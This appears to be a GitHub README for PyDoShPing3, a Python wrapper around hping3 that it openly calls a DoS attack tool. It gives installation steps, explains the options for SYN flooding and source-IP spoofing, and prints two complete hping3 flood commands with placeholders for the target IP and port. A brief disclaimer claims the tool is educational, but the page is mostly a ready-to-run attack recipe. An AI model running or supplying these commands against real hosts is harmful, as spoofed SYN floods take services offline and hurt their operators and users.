<h1 align="center">PyDoShPing3</h1>

<img src="https://github.com/ghostn4444/DoS-Attack/blob/main/fotor_2023-3-25_20_18_24.png" >

```
██╗  ██╗██████╗ ██╗███╗   ██╗ ██████╗ ██████╗ 
██║  ██║██╔══██╗██║████╗  ██║██╔════╝ ╚════██╗
███████║██████╔╝██║██╔██╗ ██║██║  ███╗ █████╔╝
██╔══██║██╔═══╝ ██║██║╚██╗██║██║   ██║ ╚═══██╗
██║  ██║██║     ██║██║ ╚████║╚██████╔╝██████╔╝
╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═════╝

██████╗  ██████╗ ███████╗  .--.  @Ghotsn4444
██╔══██╗██╔═══██╗██╔════╝ █|__| .-------.
██║  ██║██║   ██║███████╗ █|=.| █|.-----.|
██║  ██║██║   ██║╚════██║ █|--| █|| DoS ||
██████╔╝╚██████╔╝███████║ █|  | █|'-----'|
╚═════╝  ╚═════╝ ╚══════╝ █|__|~')_____(' 

[*] IP: 
[*] PORT:
```
# Descrição:
### Ferramenta de ataque DoS simples em python.

## Requirements
  * Python3
  * hPing3


### hping3
```bash
sudo apt install hping3
```

### Clone this repository
<code>git clone https://github.com/ghostn4444/DoS-Attack.git</code>

### Enter the directory
<code>cd PyDoShPing3</code>

### Install all modules
<code>pip3 install -r files/requirements.txt</code>

### Run the tool
<code>python3 PyDoShPing3.py</code>

## Requirements in Python
  * colorama
  * datetime
 
## Options
 
 ```bash
--rand-source   	Ocutar IP Pacote randomico
--flood 		faz o SYN flood ou o ataque DOS no host de destino.
-d  --data		tamanho dos dados
-a --spoof		dirección de origen falsa
contagem de pacotes	contagem de pacotes
-d 			tamanho dos pacotes
-S			Para enviar pacotes SYN para o endereço IP de destino
-V			verbose mode

# standard
hping3 -S --rand-source --flood -V -p "PORTS" -d 120 "IP"
 
# other modes
hping3 -c 100000 -d 10000 -S -p "PORTS" --flood --rand-source "IP" 
 ```
 
# [!] Isenção de responsabilidade

### Esta ferramenta é desenvolvida para fins educacionais. Você tem suas próprias responsabilidades e é responsável por qualquer dano ou violação de leis por esta ferramenta. O autor não é responsável por qualquer uso indevido do PyDoShPing3! 
 
### Este repositório é de código aberto para ajudar os outros. Portanto, se desejar copiar, considere dar os créditos! 
